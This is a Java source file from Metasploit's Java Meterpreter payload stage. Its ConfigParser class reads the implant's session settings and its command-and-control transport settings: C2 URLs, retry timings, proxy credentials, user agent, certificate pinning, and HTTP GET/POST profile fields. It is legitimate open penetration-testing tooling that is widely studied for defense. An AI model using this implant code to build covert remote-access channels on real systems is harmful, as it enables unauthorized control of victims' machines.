package com.metasploit.stage;

import com.metasploit.TLVPacket;
import com.metasploit.TLVType;

import java.io.IOException;
import java.util.List;
import java.util.concurrent.TimeUnit;

public class ConfigParser  {

    private static final long MS = TimeUnit.SECONDS.toMillis(1);

    public static Config parseConfig(byte[] configBytes) {

        Config config = new Config();
        config.rawConfig = configBytes;
        TLVPacket configPacket;

        try {
            configPacket = TLVPacket.fromEncoded(configBytes, null);
            config.session_expiry = MS * configPacket.getIntValue(TLVType.TLV_TYPE_SESSION_EXPIRY);
            config.uuid = configPacket.getRawValue(TLVType.TLV_TYPE_UUID);
            config.session_guid = configPacket.getRawValue(TLVType.TLV_TYPE_SESSION_GUID);
        } catch (IOException ioException) {
            return null;
        } catch (IllegalArgumentException illegalArgumentException) {
            return null;
        }


        List<TLVPacket> c2Groups = configPacket.getValues(TLVType.TLV_TYPE_C2);
        for (int i = 0; i < c2Groups.size(); ++i) {
            TransportConfig transportConfig = new TransportConfig();
            TLVPacket c2Group;
            try {
                c2Group = c2Groups.get(i);
                transportConfig.url = c2Group.getStringValue(TLVType.TLV_TYPE_C2_URL);
                transportConfig.comm_timeout = MS * c2Group.getIntValue(TLVType.TLV_TYPE_C2_COMM_TIMEOUT);
                transportConfig.retry_total = MS * c2Group.getIntValue(TLVType.TLV_TYPE_C2_RETRY_TOTAL);
                transportConfig.retry_wait = MS * c2Group.getIntValue(TLVType.TLV_TYPE_C2_RETRY_WAIT);
                // these values are all required so if any are missing, skip adding it as a transport
            } catch (IllegalArgumentException illegalArgumentException) {
                continue;
            }

            if (transportConfig.url.startsWith("http")) {
                try {
                    transportConfig.proxy_url = c2Group.getStringValue(TLVType.TLV_TYPE_C2_PROXY_URL);
                    transportConfig.proxy_user = c2Group.getStringValue(TLVType.TLV_TYPE_C2_PROXY_USER, "");
                    transportConfig.proxy_pass = c2Group.getStringValue(TLVType.TLV_TYPE_C2_PROXY_PASS, "");
                } catch (IllegalArgumentException illegalArgumentException) {
                }

                transportConfig.user_agent = c2Group.getStringValue(TLVType.TLV_TYPE_C2_UA, "");
                transportConfig.custom_headers = c2Group.getStringValue(TLVType.TLV_TYPE_C2_HEADERS, "");

                byte[] loadedHash = c2Group.getRawValue(TLVType.TLV_TYPE_C2_CERT_HASH, new byte[0]);
                if (loadedHash.length > 0) {
                    transportConfig.cert_hash = loadedHash;
                }

                // Parse C2 profile GET/POST sub-groups
                transportConfig.c2Get = parseC2VerbGroup(c2Group, TLVType.TLV_TYPE_C2_GET);
                transportConfig.c2Post = parseC2VerbGroup(c2Group, TLVType.TLV_TYPE_C2_POST);
            }
            config.transportConfigList.add(transportConfig);
        }
        return config;
    }

    private static C2VerbConfig parseC2VerbGroup(TLVPacket c2Group, int groupType) {
        TLVPacket verbGroup;
        try {
            verbGroup = (TLVPacket) c2Group.getValue(groupType);
        } catch (IllegalArgumentException e) {
            return null;
        }

        C2VerbConfig config = new C2VerbConfig();
        config.uri = verbGroup.getStringValue(TLVType.TLV_TYPE_C2_URI, null);
        config.enc = (Integer) verbGroup.getValue(TLVType.TLV_TYPE_C2_ENC, new Integer(0));
        config.prefix = verbGroup.getRawValue(TLVType.TLV_TYPE_C2_PREFIX, null);
        config.suffix = verbGroup.getRawValue(TLVType.TLV_TYPE_C2_SUFFIX, null);
        config.prefixSkip = (Integer) verbGroup.getValue(TLVType.TLV_TYPE_C2_PREFIX_SKIP, new Integer(0));
        config.suffixSkip = (Integer) verbGroup.getValue(TLVType.TLV_TYPE_C2_SUFFIX_SKIP, new Integer(0));
        config.uuidGet = verbGroup.getStringValue(TLVType.TLV_TYPE_C2_UUID_GET, null);
        config.uuidHeader = verbGroup.getStringValue(TLVType.TLV_TYPE_C2_UUID_HEADER, null);
        config.uuidCookie = verbGroup.getStringValue(TLVType.TLV_TYPE_C2_UUID_COOKIE, null);
        return config;
    }
}
